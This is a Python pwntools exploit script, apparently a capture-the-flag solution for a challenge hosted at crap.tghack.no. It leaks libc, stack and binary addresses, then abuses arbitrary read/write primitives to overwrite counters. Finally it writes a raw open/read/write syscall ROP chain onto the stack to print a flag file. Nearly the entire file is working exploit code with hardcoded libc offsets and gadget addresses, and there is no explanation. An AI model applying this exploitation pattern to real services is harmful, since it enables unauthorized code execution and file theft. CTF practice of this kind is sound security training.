from pwn import *


#not finished 
def read(s,addr):
    s.sendlineafter("> ","1")
    s.sendlineafter("addr: ",addr)
    p.recvuntil("value: ")
    leaked = p.recvline()
    return leaked.strip()

#not finished 
def write(s,addr,value):
    s.sendlineafter("> ","2")
    s.sendline(hex(addr)+ " " + hex(value))


def leave_feedback(s,feedback,free=True):
    s.sendlineafter("> ","3")
    s.sendline(feedback)
    if free:
        s.sendline("n")
    else:
        s.sendline("y")

def view_feedback(s):
    s.sendlineafter("> ","4")
    s.recvuntil("feedback: ")
    data = s.recvuntil("\n").strip()
    return data

def quit(s):
    s.sendline("5")


p = remote("crap.tghack.no",6001)
#p = process("./final")
leave_feedback(p,"abc")
libc_addr = view_feedback(p)
leaked_fd = u64(libc_addr.ljust(8,"\x00"))
base = leaked_fd - 3890144
malloc_hook = base + 0x00000000003b5b70
mprotect = base + 0x00000000000f0bd0
pop_rdi = base + 0x0000000000021882
pop_rsi = base + 0x0000000000022192
pop_rdx = base + 0x0000000000001b9a
leave_ret = base + 0x0000000000040222
libc_bss = base + 0x00000000003b67a0
environ = base + 0x00000000003b8618
stderr = base + 0x3b65c0
fake_vtable=base+0x3b6840
open_libc=base+0xe7740
syscall_open=base+0xe777d
read_libc=base+0xe79d0
write_libc=base+0xe7a70
pop_rax=base+0x0000000000038e88
syscall_ret=base+0x0000000000039049
pop_rcx_rbx=base+0x00000000000dde9a
mov_rdx_rax=base+0x000000000011079d
fopen=base+0x000000000006e080
fgets_libc=base+0x000000000006dd40
fonction=base+0x7a9c0

print "fcontion: ",hex(fonction)

print "bss_libc: ",hex(libc_bss)
print "leaked: ",hex(leaked_fd)
print "base: ",hex(base)
print "malloc_hook: ",hex(malloc_hook)
print "mprotect: ",hex(mprotect)
print "pop_rdi: ",hex(pop_rdi)
print "pop_rsi: ",hex(pop_rsi)
print "pop_rdx: ",hex(pop_rdx)
print "leave_ret: ",hex(leave_ret)
print "environ: ",hex(environ)
print "stderr: ",hex(stderr)
print "fake_vtable:",hex(fake_vtable)
#print hex(u64(libc_addr[:6:].ljust(8,'\x00')))
"""
leaked_heap = read(p,hex(leaked_fd))
leaked_heap = int(leaked_heap,16)
print "leaked heap: ",hex(leaked_heap)
heap_base = leaked_heap - 0x32f0
binbase = base + 0x2a92d5cdc000
print "binbase: ",hex(binbase)
#leave_feedback(p,"A"*1280)
"""
leaked_stack = read(p,hex(environ))
leaked_stack = int(leaked_stack,16)
eip_main=leaked_stack-256
eip_do_write=eip_main-32
print "leaked_stack: ",hex(leaked_stack)
print "eip_main: ",hex(eip_main)
to_leak = leaked_stack -264
leaked_bin = read(p,hex(to_leak))
leaked_bin = int(leaked_bin,16)
bin_base = leaked_bin - 4640
print "binbase: ",hex(bin_base)
print "do_write: ",hex(bin_base+0xfe6)
bss = bin_base + 0x0000000000205010
write_count = bin_base+0x0000000000202034
feedback = write_count+0x4
read_count = write_count - 0x4
print "feedback: ",hex(feedback)
print "write_count: ",hex(write_count)
write(p,read_count,0)
write(p,write_count,4294967096)

k=read(p,hex(leaked_fd))
leaked_heap=int(k,16)
print "leaked_heap :",hex(leaked_heap)
flag_file=leaked_heap-0x1260
print "flag_file :",hex(flag_file)
write(p,feedback,0)
leave_feedback(p,"/home/crap/flag.txt\x00r\x00",False)
rop_chain=[
pop_rdi,
0,
pop_rax,
3,
syscall_ret,
pop_rdi,
flag_file,
pop_rsi,
0,
pop_rax,
0x2,
pop_rdx,
0,
syscall_ret,#open
pop_rdi,
0,
pop_rsi,
flag_file,
pop_rdx,
0x100,
pop_rax,
0x0,
syscall_ret,#read
pop_rdi,
1,
pop_rsi,
flag_file,
pop_rdx,
0x100,
pop_rax,
0x1,
syscall_ret
]
"""
rop_chain=[
pop_rdi,
flag_file,
pop_rsi,
flag_file+20,
fopen,#open
pop_rdi,
flag_file,
pop_rsi,
0x100,
mov_rdx_rax,
fgets_libc,
pop_rdi
]
"""
for i in range(len(rop_chain)):
	write(p,eip_main+(i*8),rop_chain[i])

pause()
write(p,eip_do_write,leave_ret)
#write(p,fake_vtable,0x414243)
p.interactive()
